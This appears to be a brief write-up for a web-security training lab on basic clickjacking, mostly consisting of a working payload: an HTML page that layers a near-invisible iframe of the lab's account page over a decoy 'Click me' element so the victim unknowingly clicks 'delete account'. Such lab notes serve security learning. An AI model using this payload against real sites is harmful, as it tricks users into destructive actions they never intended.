Basic clickjacking with CSRF token protection:

    -This challenge is about fooling the user by replacing a page for attack.
    -<style>
        #frame{
            position:relative;
            width:1000;
            height: 700;
            opacity:0.0001;
            z-index: 2;
        }
        #Div{
            position:absolute;
            top:515;
            left:62;
            z-index: 1;
        }
    </style>
    <div id="Div">Click me</div>
    <iframe src="https://0a0500da034259d5802a0da6002f00ad.web-security-academy.net/my-account" id="frame"></iframe>

    -This will replace the click me by delete account but the user cant see that
    
